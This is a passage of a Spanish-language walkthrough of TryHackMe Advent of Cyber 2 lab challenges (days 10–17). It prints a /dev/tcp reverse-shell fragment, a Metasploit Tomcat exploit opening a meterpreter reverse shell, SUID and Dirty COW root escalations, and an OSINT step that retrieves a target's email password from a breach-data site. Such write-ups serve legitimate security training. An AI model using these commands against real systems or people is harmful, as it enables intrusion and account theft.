\u0026gt;\u0026amp; /dev/tcp/10.10.10.10/1338 0\u0026gt;\u0026amp;1 kali@kali:~/thm/adventcyber2$       'use strict'; var containerId = JSON.parse(\"\\\"8cffdf025cd0db84\\\"\"); var containerElem = document.getElementById(containerId); var codetabLinks = null; var codetabContents = null; var ids = []; if (containerElem) { codetabLinks = containerElem.querySelectorAll('.codetab__link'); codetabContents = containerElem.querySelectorAll('.codetab__content'); } for (var i = 0; i 0) { codetabContents[0].style.display = 'block'; }  DAY 10 - Networking Un servicio SAMBA esta expuesto en la IP del reto, la descripcion del reto dá suficiente informacion para resolver cada una de las tareas con las herramientas enum4linux y smbclient. Se realiza un escaneo con enum4linux para busqueda de nombres de usuarios y SHARENAMES con los cuales verificamos en cual de estos SHARENAMES permite entrar sin ninguna credencial.\nbash bash  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  kali@kali:~/thm/adventcyber2$ enum4linux -S -U 10.10.77.26 2\u0026gt;/dev/null Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Dec 14 11:45:44 2020 [... snip ...] ========================================== | Getting domain SID for 10.10.77.26 | ========================================== Domain Name: TBFC-SMB-01 Domain Sid: (NULL SID) [+] Can\u0026#39;t determine if host is part of domain or part of a workgroup ============================ | Users on 10.10.77.26 | ============================ index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: elfmcskidy Name: Desc: index: 0x2 RID: 0x3ea acb: 0x00000010 Account: elfmceager Name: elfmceager Desc: index: 0x3 RID: 0x3e9 acb: 0x00000010 Account: elfmcelferson Name: Desc: user:[elfmcskidy] rid:[0x3e8] user:[elfmceager] rid:[0x3ea] user:[elfmcelferson] rid:[0x3e9] ======================================== | Share Enumeration on 10.10.77.26 | ======================================== Sharename Type Comment --------- ---- ------- tbfc-hr Disk tbfc-hr tbfc-it Disk tbfc-it tbfc-santa Disk tbfc-santa IPC$ IPC IPC Service (tbfc-smb server (Samba, Ubuntu)) SMB1 disabled -- no workgroup available [+] Attempting to map shares on 10.10.77.26 //10.10.77.26/tbfc-hr Mapping: DENIED, Listing: N/A //10.10.77.26/tbfc-it Mapping: DENIED, Listing: N/A //10.10.77.26/tbfc-santa Mapping: OK, Listing: OK //10.10.77.26/IPC$ [E] Can\u0026#39;t understand response: NT_STATUS_OBJECT_NAME_NOT_FOUND listing \\* enum4linux complete on Mon Dec 14 11:46:32 2020     1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  kali@kali:~/thm/adventcyber2$ smbclient \\\\\\\\10.10.77.26\\\\tbfc-hr Enter WORKGROUP\\kali\u0026#39;s password: tree connect failed: NT_STATUS_ACCESS_DENIED kali@kali:~/thm/adventcyber2$ smbclient \\\\\\\\10.10.77.26\\\\tbfc-it Enter WORKGROUP\\kali\u0026#39;s password: tree connect failed: NT_STATUS_ACCESS_DENIED kali@kali:~/thm/adventcyber2$ smbclient \\\\\\\\10.10.77.26\\\\tbfc-santa Enter WORKGROUP\\kali\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Wed Nov 11 21:12:07 2020 .. D 0 Wed Nov 11 20:32:21 2020 jingle-tunes D 0 Wed Nov 11 21:10:41 2020 note_from_mcskidy.txt N 143 Wed Nov 11 21:12:07 2020 10252564 blocks of size 1024. 5368116 blocks available smb: \\\u0026gt; get note_from_mcskidy.txt getting file \\note_from_mcskidy.txt of size 143 as note_from_mcskidy.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec) smb: \\\u0026gt; cd jingle-tunes smb: \\jingle-tunes\\\u0026gt; ls . D 0 Wed Nov 11 21:10:41 2020 .. D 0 Wed Nov 11 21:12:07 2020 10252564 blocks of size 1024. 5368116 blocks available smb: \\jingle-tunes\\\u0026gt; exit kali@kali:~/thm/adventcyber2$ cat note_from_mcskidy.txt Hi Santa, I decided to put all of your favourite jingles onto this share - allowing you access it from anywhere you like! Regards ~ ElfMcSkidy kali@kali:~/thm/adventcyber2$       'use strict'; var containerId = JSON.parse(\"\\\"521f83c69789640e\\\"\"); var containerElem = document.getElementById(containerId); var codetabLinks = null; var codetabContents = null; var ids = []; if (containerElem) { codetabLinks = containerElem.querySelectorAll('.codetab__link'); codetabContents = containerElem.querySelectorAll('.codetab__content'); } for (var i = 0; i 0) { codetabContents[0].style.display = 'block'; }  DAY 11 - Networking Se presenta una maquina en la cual tenemos acceso y es necesario escalar privilegios utilizando los \u0026ldquo;comandos/guias\u0026rdquo; de GTFObins. Con la informacion descrita en el reto del dia es suficiente para resolver las tareas y obtener la flag. Enumeracion de archivos con permisos SUID.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  -bash-4.4$ find / -perm -4000 2\u0026gt; /dev/null | xargs ls -lah -rwsr-xr-x 1 root root 1.1M Jun 6 2019 /bin/bash -rwsr-xr-x 1 root root 31K Aug 11 2016 /bin/fusermount -rwsr-xr-x 1 root root 43K Sep 16 18:43 /bin/mount -rwsr-xr-x 1 root root 63K Jun 28 2019 /bin/ping -rwsr-xr-x 1 root root 44K Mar 22 2019 /bin/su -rwsr-xr-x 1 root root 27K Sep 16 18:43 /bin/umount ... snap stuff - snip ... -rwsr-sr-x 1 daemon daemon 51K Feb 20 2018 /usr/bin/at -rwsr-xr-x 1 root root 75K Mar 22 2019 /usr/bin/chfn -rwsr-xr-x 1 root root 44K Mar 22 2019 /usr/bin/chsh -rwsr-xr-x 1 root root 75K Mar 22 2019 /usr/bin/gpasswd -rwsr-xr-x 1 root root 37K Mar 22 2019 /usr/bin/newgidmap -rwsr-xr-x 1 root root 40K Mar 22 2019 /usr/bin/newgrp -rwsr-xr-x 1 root root 37K Mar 22 2019 /usr/bin/newuidmap -rwsr-xr-x 1 root root 59K Mar 22 2019 /usr/bin/passwd -rwsr-xr-x 1 root root 22K Mar 27 2019 /usr/bin/pkexec -rwsr-xr-x 1 root root 146K Jan 31 2020 /usr/bin/sudo -rwsr-xr-x 1 root root 19K Jun 28 2019 /usr/bin/traceroute6.iputils -rwsr-xr-- 1 root messagebus 42K Jun 11 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 10K Mar 28 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 427K Mar 4 2019 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 14K Mar 27 2019 /usr/lib/policykit-1/polkit-agent-helper-1 -rwsr-xr-x 1 root root 111K Jul 10 14:00 /usr/lib/snapd/snap-confine -rwsr-xr-x 1 root root 99K Nov 23 2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic -bash-4.4$   Utilizamos bash para obtener una shell root y la flag.\n1 2 3 4 5 6 7 8 9 10 11  -bash-4.4$ /bin/bash -p bash-4.4# cd bash-4.4# whoami; pwd root /home/cmnatic bash-4.4# cd /root bash-4.4# ls flag.txt bash-4.4# cat flag.txt thm{2fb1[... snip ...]592} bash-4.4#   DAY 12 - Networking Se presenta una maquina vulnerable a ShellShock attack utilizando metasploit y la informacion descrita en el reto del dia es posible resolver las tareas y obtener la flag.\nConfiguracion de metasploit con el exploit windows/http/tomcat_cgi_cmdlineargs.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85  msf5 exploit(windows/http/tomcat_cgi_cmdlineargs) \u0026gt; show options Module options (exploit/windows/http/tomcat_cgi_cmdlineargs): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.92.152 yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 8080 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) TARGETURI / yes The URI path to CGI script VHOST no HTTP server virtual host Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: \u0026#39;\u0026#39;, seh, thread, process, none) LHOST 10.2.29.162 yes The listen address (an interface may be specified) LPORT 1338 yes The listen port Exploit target: Id Name -- ---- 0 Apache Tomcat 9.0 or prior for Windows msf5 exploit(windows/http/tomcat_cgi_cmdlineargs) \u0026gt; set TARGETURI /cgi-bin/elfwhacker.bat TARGETURI =\u0026gt; /cgi-bin/elfwhacker.bat msf5 exploit(windows/http/tomcat_cgi_cmdlineargs) \u0026gt; run [*] Started reverse TCP handler on 10.2.29.162:1338 [*] Checking if 10.10.92.152 is vulnerable [*] 10.10.92.152 seems vulnerable, what a good day. [*] Command Stager progress - 6.95% done (6999/100668 bytes) [*] Command Stager progress - 13.91% done (13998/100668 bytes) [*] Command Stager progress - 20.86% done (20997/100668 bytes) [*] Command Stager progress - 27.81% done (27996/100668 bytes) [*] Command Stager progress - 34.76% done (34995/100668 bytes) [*] Command Stager progress - 41.72% done (41994/100668 bytes) [*] Command Stager progress - 48.67% done (48993/100668 bytes) [*] Command Stager progress - 55.62% done (55992/100668 bytes) [*] Command Stager progress - 62.57% done (62991/100668 bytes) [*] Command Stager progress - 69.53% done (69990/100668 bytes) [*] Command Stager progress - 76.48% done (76989/100668 bytes) [*] Command Stager progress - 83.43% done (83988/100668 bytes) [*] Command Stager progress - 90.38% done (90987/100668 bytes) [*] Command Stager progress - 97.34% done (97986/100668 bytes) [*] Command Stager progress - 100.02% done (100692/100668 bytes) [*] Sending stage (176195 bytes) to 10.10.92.152 [*] Meterpreter session 1 opened (10.2.29.162:1338 -\u0026gt; 10.10.92.152:49815) at 2020-12-14 12:36:58 -0500 meterpreter \u0026gt; search -f flag1.txt Found 1 result... c:\\Program Files\\Apache Software Foundation\\Tomcat 9.0\\webapps\\ROOT\\WEB-INF\\cgi-bin\\flag1.txt (27 bytes) meterpreter \u0026gt; meterpreter \u0026gt; shell Process 2744 created. Channel 2 created. Microsoft Windows [Version 10.0.17763.1637] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Program Files\\Apache Software Foundation\\Tomcat 9.0\\webapps\\ROOT\\WEB-INF\\cgi-bin\u0026gt;dir dir Volume in drive C has no label. Volume Serial Number is 4277-4242 Directory of C:\\Program Files\\Apache Software Foundation\\Tomcat 9.0\\webapps\\ROOT\\WEB-INF\\cgi-bin 14/12/2020 23:37 \u0026lt;DIR\u0026gt; . 14/12/2020 23:37 \u0026lt;DIR\u0026gt; .. 14/12/2020 23:37 73,802 DXKwV.exe 19/11/2020 21:39 825 elfwhacker.bat 19/11/2020 22:06 27 flag1.txt 3 File(s) 74,654 bytes 2 Dir(s) 6,550,839,296 bytes free C:\\Program Files\\Apache Software Foundation\\Tomcat 9.0\\webapps\\ROOT\\WEB-INF\\cgi-bin\u0026gt;type flag1.txt type flag1.txt thm{whacking[... snip ...]elves} C:\\Program Files\\Apache Software Foundation\\Tomcat 9.0\\webapps\\ROOT\\WEB-INF\\cgi-bin\u0026gt;   Utilizando local_exploit_suggester para listar los exploits para la maquina que puedan ser utiles para escalar privilegios.\n1 2 3 4 5 6 7  meterpreter \u0026gt; run post/multi/recon/local_exploit_suggester [*] 10.10.92.152 - Collecting local exploits for x86/windows... [*] 10.10.92.152 - 30 exploit checks are being tried... [+] 10.10.92.152 - exploit/windows/local/ikeext_service: The target appears to be vulnerable. [+] 10.10.92.152 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable. meterpreter \u0026gt;   Aunque el usuario actual al parecer ya pertenece al grupo de Administradores.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  C:\\Program Files\\Apache Software Foundation\\Tomcat 9.0\\webapps\\ROOT\\WEB-INF\\cgi-bin\u0026gt;whoami whoami tbfc-web-01\\elfmcskidy C:\\Program Files\\Apache Software Foundation\\Tomcat 9.0\\webapps\\ROOT\\WEB-INF\\cgi-bin\u0026gt;net user elfmcskidy net user elfmcskidy User name elfmcskidy Full Name elfmcskidy Comment User\u0026#39;s comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 19/11/2020 13:16:41 Password expires Never Password changeable 19/11/2020 13:16:41 Password required Yes User may change password No Workstations allowed All Logon script User profile Home directory Last logon 14/12/2020 23:21:08 Logon hours allowed All Local Group Memberships *Administrators *Users Global Group memberships *None   DAY 13 - Coal for Christmas Con la maquina dada se realiza las siguientes tareas con la ayuda de la descripcion de cada una:\n Port Scanning Initial Access Enumeration Privilege Escalation  PORT SCANNING - NMAP Se realiza un escaneo de puertos donde encontramos los puertos ssh (22), telnet (23) y rpcbind (111).\n1 2 3 4 5 6 7 8 9 10  Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-14 13:23 EST Nmap scan report for 10.10.155.23 (10.10.155.23) Host is up (0.25s latency). Not shown: 997 closed ports PORT STATE SERVICE 22/tcp open ssh 23/tcp open telnet 111/tcp open rpcbind Nmap done: 1 IP address (1 host up) scanned in 52.89 seconds   INITIAL ACCESS - TELNET A traves del puerto 23 de telnet realizamos la conexion donde se presentan unas credenciales con las cuales se logró obtener una shell.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  kali@kali:~/thm/adventcyber2$ telnet 10.10.155.23 23 Trying 10.10.155.23... Connected to 10.10.155.23. Escape character is \u0026#39;^]\u0026#39;. HI SANTA!!! We knew you were coming and we wanted to make it easy to drop off presents, so we created an account for you to use. Username: santa Password: clauschristmas We left you cookies and milk! christmas login: santa Password: Last login: Sat Nov 21 20:37:37 UTC 2020 from 10.0.2.2 on pts/2 \\ / --\u0026gt;*\u0026lt;-- /o\\  /_\\_\\  /_/_0_\\  /_o_\\_\\_\\  /_/_/_/_/o\\  /@\\_\\_\\@\\_\\_\\  /_/_/O/_/_/_/_\\  /_\\_\\_\\_\\_\\o\\_\\_\\  /_/0/_/_/_0_/_/@/_\\  /_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\  /_/o/_/_/@/_/_/o/_/0/_\\  [___] $ whoami; pwd santa /home/santa $   ENUMERATION Version del sistema operativo Ubuntu 12.04.\n1 2 3 4 5 6 7 8  $ uname -a Linux christmas 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux $ cat /etc/*release DISTRIB_ID=Ubuntu DISTRIB_RELEASE=12.04 DISTRIB_CODENAME=precise DISTRIB_DESCRIPTION=\u0026#34;Ubuntu 12.04 LTS\u0026#34; $   En la maquina existe un archivo el cual está escrito en C, que al realizar una busqueda de una porcion de codigo encontramos que es parte del exploit de dirtycow. Aunque en la descripcion del reto se explica esta parte.\nPRIVILEGE ESCALATION Utilizando el codigo fuente del exploit encontrado en la maquina para obtener una shell con usuario root, copiando el codigo fuente a la maquina, compilar y ejecutar.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71  $ gcc -pthread dirty.c -o dirty -lcrypt $ ls -lah total 44K drwxr-xr-x 3 santa santa 4.0K Dec 15 00:46 . drwxr-xr-x 3 root root 4.0K Nov 21 20:37 .. drwx------ 2 santa santa 4.0K Nov 21 20:37 .cache -rwxr-xr-x 1 santa santa 1.4K Nov 21 20:37 christmas.sh -rw-r--r-- 1 santa santa 2.9K Nov 21 20:37 cookies_and_milk.txt -rwxrwxr-x 1 santa santa 14K Dec 15 00:46 dirty -rw-rw-r-- 1 santa santa 4.8K Dec 14 18:45 dirty.c $ chmod +x dirty $ ./dirty /etc/passwd successfully backed up to /tmp/passwd.bak Please enter the new password: Complete line: firefart:fi6bS9A.C7BDQ:0:0:pwned:/root:/bin/bash mmap: 7f4c58c6b000 madvise 0 ptrace 0 Done! Check /etc/passwd to see if the new user was created. You can log in with the username \u0026#39;firefart\u0026#39; and the password \u0026#39;test\u0026#39;. DON\u0026#39;T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd Done! Check /etc/passwd to see if the new user was created. You can log in with the username \u0026#39;firefart\u0026#39; and the password \u0026#39;test\u0026#39;. DON\u0026#39;T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd $ su firefart Password: firefart@christmas:/# cd /root firefart@christmas:~# ls -lah total 24K drwx------ 2 firefart root 4.0K Nov 21 20:38 . drwxr-xr-x 24 firefart root 4.0K Nov 21 20:38 .. -rw------- 1 firefart root 0 Nov 21 20:38 .bash_history -rw-r--r-- 1 firefart root 3.1K Apr 19 2012 .bashrc -rwxr-xr-x 1 firefart root 1.4K Nov 21 20:37 christmas.sh -rw-r--r-- 1 firefart root 611 Nov 21 20:37 message_from_the_grinch.txt -rw-r--r-- 1 firefart root 140 Apr 19 2012 .profile firefart@christmas:~# cat mess* Nice work, Santa! Wow, this house sure was DIRTY! I think they deserve coal for Christmas, don\u0026#39;t you? So let\u0026#39;s leave some coal under the Christmas `tree`! Let\u0026#39;s work together on this. Leave this text file here, and leave the christmas.sh script here too... but, create a file named `coal` in this directory! Then, inside this directory, pipe the output of the `tree` command into the `md5sum` command. The output of that command (the hash itself) is the flag you can submit to complete this task for the Advent of Cyber! - Yours, John Hammond er, sorry, I mean, the Grinch - THE GRINCH, SERIOUSLY firefart@christmas:~# touch coal firefart@christmas:~# tree | md5sum 8b16f0[... SNIP ...]f7f8427cc - firefart@christmas:~#   DAY 14 - Where\u0026rsquo;s Rudolph? Se presenta un reto en el cual involucra un nombre de usuario: IGuidetheClaus2020. con el cual debemos de recabar informacion utilizando fuentes de datos abiertas (OSINT). Para las tareas del 1-5 debemos de indagar en el subreddit de este usuario, para la 6-11 en su cuenta de Twitter.\n  1: https://www.reddit.com/user/IGuidetheClaus2020/comments/\n  2: https://www.reddit.com/r/books/comments/jsvby8/chicago_public_library_says_eliminating_fines_has/gdjz4ef/?context=3\n  3: Como se menciona en esta tarea, utilizamos Google para buscar el apellido del Creador de Rudolph.\n  4: En los resultados de busqueda de Google aparece el usuario en: Twitter\n  5: Su cuenta de usuario: @IGuideClaus2020\n  6: De acuerdo con su cuenta de twitter, a este usuario parece interesarle el programa de TV Bachelorette el cual tiene más retwitts y \u0026ldquo;favs\u0026rdquo;.\n  7: En uno de sus twitts se presentan dos imagenes las cuales utilizamos para obtener la ubicacion del estado donde fueron tomadas, con Google Images: Chicago\n  8: En uno de sus twitts escribe la URL de la imagen en \u0026ldquo;alta resolucion\u0026rdquo; del lugar donde desfiló. Utilizando Jeffrey's Image Metadata Viewer logramos obtener la ubicacion de GPS (EXIF: Latitude y Longitude).\n  9: Con la pagina en la tarea anterior tambien encontramos la flag.\n  10: En la cuenta de twitter especificamente en su biografia, aparece un correo electronico. Con la ayuda de scylla.sh logramos obtener la contraseña de su correo electronico.\n  11: Utilizando la ubicacion (longitud/latitud) que encontramos en la Tarea 8, buscamos el numero de calle del hotel más cercano donde se hospedó.\n  Del porqué esa direccion, es porque tambien mencionó en uno de sus twitts que la foto era cerca de su hotel y tiempo despues mencionó el hotel Marriot.\nDAY 15 - Scripting Se presenta una serie de tareas relacionadas al lenguaje de programacion Python las cuales es posible resolver con la descripcion del reto del dia y utilizando una consola de Python.\n Spoiler warning  What's the output of True + True? 2 What's the database for installing other peoples libraries called? Pypi What is the output of bool(\u0026quot;False\u0026quot;)? True What library lets us download the HTML of a webpage? requests What is the output of the program provided in \u0026quot;Code to analyse for Question 5\u0026quot; in today's material? [1, 2, 3, 6] What causes the previous task to output that? pass by reference   DAY 16 - Scripting Continuando con scripting, se presenta una maquina a la cual hay que encontrar:\n Puerto donde esta corriendo la pagina web. Un directorio/pagina oculta. Numero impar correcto de la API key.  Utilizando el modulo python-nmap de PyPI creamos un pequeño script para escaneo de puertos, con el cual encontramos el puerto 8000 abierto.\njava javascript  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  #!/usr/bin/env python import nmap host = \u0026#39;10.10.133.55\u0026#39; nm = nmap.PortScanner() nm.scan(host, \u0026#39;-p- --min-rate 1000 -sV\u0026#39;) for host in nm.all_hosts(): print(\u0026#39;----------------------------------------------------\u0026#39;) print( \u0026#39;Host:{} {}\u0026#39;.format(host, nm[host].hostname()) ) print( \u0026#39;Estado: {}\u0026#39;.format(nm[host].state()) ) print(\u0026#39;----------------------------------------------------\u0026#39;) for i in nm[host].all_protocols(): print(\u0026#39;Protocolo: {}\u0026#39;.format(i)) print(\u0026#39;----------------------------------------------------\u0026#39;) ports = nm[host][i].keys() ports.sort() for port in ports: print(\u0026#39;Puerto: {} \\tEstado: {}\u0026#39;.format(port, nm[host][i][port][\u0026#34;state\u0026#34;]))     1 2 3 4 5 6 7 8 9  kali@kali:~/thm/adventcyber2$ python script2.py ---------------------------------------------------- Host:10.10.133.55 10.10.133.55 Estado: up ---------------------------------------------------- Protocolo: tcp ---------------------------------------------------- Puerto: 8000 Estado: open kali@kali:~/thm/adventcyber2$       'use strict'; var containerId = JSON.parse(\"\\\"23966aedf8b9abe1\\\"\"); var containerElem = document.getElementById(containerId); var codetabLinks = null; var codetabContents = null; var ids = []; if (containerElem) { codetabLinks = containerElem.querySelectorAll('.codetab__link'); codetabContents = containerElem.querySelectorAll('.codetab__content'); } for (var i = 0; i 0) { codetabContents[0].style.display = 'block'; }  Nuevamente utilizando Python y con la lo aprendido el Dia 15 extrajimos todos las direcciones o links dentro de la pagina.\npython bash  1 2 3 4 5 6 7 8 9 10  import requests from bs4 import BeautifulSoup url = \u0026#34;http://10.10.133.55:8000/static/index.html\u0026#34; req = requests.get(url) soup = BeautifulSoup(req.content, \u0026#39;lxml\u0026#39;) links = soup.find_all(\u0026#34;a\u0026#34;) for link in links: print(link.get(\u0026#39;href\u0026#39;))     1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  kali@kali:~/thm/adventcyber2$ python script3.py ../ None https://github.com/BulmaTemplates/bulma-templates/blob/master/templates/hero.html https://tryhackme.com https://tryhackme.com https://tryhackme.com https://tryhackme.com https://tryhackme.com https://tryhackme.com https://tryhackme.com https://tryhackme.com https://tryhackme.com https://tryhackme.com https://tryhackme.com # # # # # # # # # http://machine_ip/api/api_key # # # # # # # # # https://github.com/BulmaTemplates/bulma-templates https://github.com/BulmaTemplates/bulma-templates       'use strict'; var containerId = JSON.parse(\"\\\"9c8238c0cd5c5932\\\"\"); var containerElem = document.getElementById(containerId); var codetabLinks = null; var codetabContents = null; var ids = []; if (containerElem) { codetabLinks = containerElem.querySelectorAll('.codetab__link'); codetabContents = containerElem.querySelectorAll('.codetab__content'); } for (var i = 0; i 0) { codetabContents[0].style.display = 'block'; }  Para poder encontrar el valor correcto de la api_key utilizamos un pequeño script el cual realizaba solicitude hacia la API.\npython bash  1 2 3 4 5 6 7 8 9 10 11 12  #!/usr/bin/env python import requests url = \u0026#34;http://10.10.133.55:8000/api/\u0026#34; for i in range(0,100): n = i if i%2 != 0 else 0 if n != 0: print(str(n)) req = requests.get(url+str(n)) print(req.text)     1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  kali@kali:~/thm/adventcyber2$ python script4.py 1 {\u0026#34;item_id\u0026#34;:1,\u0026#34;q\u0026#34;:\u0026#34;SANTA PROTECTION MECHANISM ACTIVATED.\u0026#34;} 3 {\u0026#34;item_id\u0026#34;:3,\u0026#34;q\u0026#34;:\u0026#34;SANTA PROTECTION MECHANISM ACTIVATED.\u0026#34;} 5 {\u0026#34;item_id\u0026#34;:5,\u0026#34;q\u0026#34;:\u0026#34;SANTA PROTECTION MECHANISM ACTIVATED.\u0026#34;} 7 {\u0026#34;item_id\u0026#34;:7,\u0026#34;q\u0026#34;:\u0026#34;SANTA PROTECTION MECHANISM ACTIVATED.\u0026#34;} 9 {\u0026#34;item_id\u0026#34;:9,\u0026#34;q\u0026#34;:\u0026#34;SANTA PROTECTION MECHANISM ACTIVATED.\u0026#34;} 11 {\u0026#34;item_id\u0026#34;:11,\u0026#34;q\u0026#34;:\u0026#34;SANTA PROTECTION MECHANISM ACTIVATED.\u0026#34;} 13 {\u0026#34;item_id\u0026#34;:13,\u0026#34;q\u0026#34;:\u0026#34;SANTA PROTECTION MECHANISM ACTIVATED.\u0026#34;} 15 [... snip ...] 55 {\u0026#34;item_id\u0026#34;:55,\u0026#34;q\u0026#34;:\u0026#34;SANTA PROTECTION MECHANISM ACTIVATED.\u0026#34;} 57 {\u0026#34;item_id\u0026#34;:57,\u0026#34;q\u0026#34;:\u0026#34;Winter Wonderland, Hyde Park, London.\u0026#34;} 59 {\u0026#34;item_id\u0026#34;:59,\u0026#34;q\u0026#34;:\u0026#34;SANTA PROTECTION MECHANISM ACTIVATED.\u0026#34;} 61 {\u0026#34;item_id\u0026#34;:61,\u0026#34;q\u0026#34;:\u0026#34;SANTA PROTECTION MECHANISM ACTIVATED.\u0026#34;} 63 ^C       'use strict'; var containerId = JSON.parse(\"\\\"cae6973682a7b4f2\\\"\"); var containerElem = document.getElementById(containerId); var codetabLinks = null; var codetabContents = null; var ids = []; if (containerElem) { codetabLinks = containerElem.querySelectorAll('.codetab__link'); codetabContents = containerElem.querySelectorAll('.codetab__content'); } for (var i = 0; i 0) { codetabContents[0].style.display = 'block'; }  DAY 17 - Reverse Engineering Las instrucciones para el reto del dia incluyen utilizar la herramienta radare2 el cual es un framework para realizar ingenieria inversa y analisis de binarios. La descripcion del reto es suficiente para obtener las respuestas.\n Valor de local_ch cuando la instruccion movl es \u0026ldquo;ejecutada\u0026rdquo;. El valor de eax cuando la instruccion ìmull es \u0026ldquo;ejecutada\u0026rdquo;. El valor de local_4h despues de que eax tiene el valor 0.  Se inicia radare2 con el archivo challenge1, se indica que se realizará un analisis con el \u0026ldquo;comando\u0026rdquo; aa. Con el \u0026ldquo;comando\u0026rdquo; afl listamos todas las funciones presentes en el archivo y junto con | grep main \u0026ldquo;filtramos\u0026rdquo; los valores de la funcion principal main. Con el nombre de la funcion se realiza un desensamblado de la funcion con el \u0026ldquo;comando\u0026rdquo; pdf @sym.main o pdf @main, lo que mostrará el codigo en ensamblador para su analisis.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  elfmceager@tbfc-day-17:~$ r2 -d ./challenge1 Process with PID 1506 started... = attach 1506 1506 bin.baddr 0x00400000 Using 0x400000 Warning: Cannot initialize dynamic strings asm.bits 64 [0x00400a30]\u0026gt; aa [ WARNING : block size exceeding max block size at 0x006ba220 [+] Try changing it with e anal.bb.maxsize WARNING : block size exceeding max block size at 0x006bc860 [+] Try changing it with e anal.bb.maxsize [x] Analyze all flags starting with sym. and entry0 (aa) [0x00400a30]\u0026gt; afl |grep main 0x00400b4d 1 35 sym.main 0x00400de0 10 1007 -\u0026gt; 219 sym.__libc_start_main 0x00403840 39 661 -\u0026gt; 629 sym._nl_find_domain 0x00403ae0 308 5366 -\u0026gt; 5301 sym._nl_load_domain 0x00415ef0 1 43 sym._IO_switch_to_main_get_area 0x0044ce10 1 8 sym._dl_get_dl_main_map 0x00470430 1 49 sym._IO_switch_to_main_wget_area 0x0048f9f0 7 73 -\u0026gt; 69 sym._nl_finddomain_subfreeres 0x0048fa40 16 247 -\u0026gt; 237 sym._nl_unload_domain [0x00400a30]\u0026gt; pdf @sym.main ;-- main: / (fcn) sym.main 35 | sym.main (); | ; var int local_ch @ rbp-0xc | ; var int local_8h @ rbp-0x8 | ; var int local_4h @ rbp-0x4 | ; DATA XREF from 0x00400a4d (entry0) | 0x00400b4d 55 push rbp | 0x00400b4e 4889e5 mov rbp, rsp | 0x00400b51 c745f4010000. mov dword [local_ch], 1 | 0x00400b58 c745f8060000. mov dword [local_8h], 6 | 0x00400b5f 8b45f4 mov eax, dword [local_ch] | 0x00400b62 0faf45f8 imul eax, dword [local_8h] | 0x00400b66 8945fc mov dword [local_4h], eax | 0x00400b69 b800000000 mov eax, 0 | 0x00400b6e 5d pop rbp \\  0x00400b6f c3 ret [0x00400a30]\u0026gt;   Para resolver la primera pregunta debemos de ubicarnos donde se encuentra la instruccion mov, donde agregámos un breakpoint para que cuando ejecutemos el programa, este haga una pausa y poder analisar el valor de local_ch. Tambien necesitamos la direccion en memoria de local_ch (las primeras lineas de la funcion main) que tiene como valor rbp-0xc. En el siguiente codigo se muestran ambas lineas.\n1 2 3  ; var int local_ch @ rbp-0xc [... snip ...] | 0x00400b51 c745f4010000. mov dword [local_ch], 1   Para agregar un breakpoint lo realizamos con el \u0026ldquo;comando\u0026rdquo; db direcciondememoria, quedaria de la siguiente forma: db 0x00400b51, ejecutamos el programa con el \u0026ldquo;comando\u0026rdquo; dc, vemos un mensaje que la ejecucion está en \u0026ldquo;pausa\u0026rdquo; en la direccion 400b51 (la indicada con db 0x00400b51) y al mostrar el codigo (pdf @sym.main) vemos resaltada la direccion de memoria y el breakpoint (una pequeña b).\nSi revisamos el valor actual de local_ch vemos que es 0000 , porque la direccion de memoria a la que estamos realizando lectura hace referencia al valor inicial al inicio de la 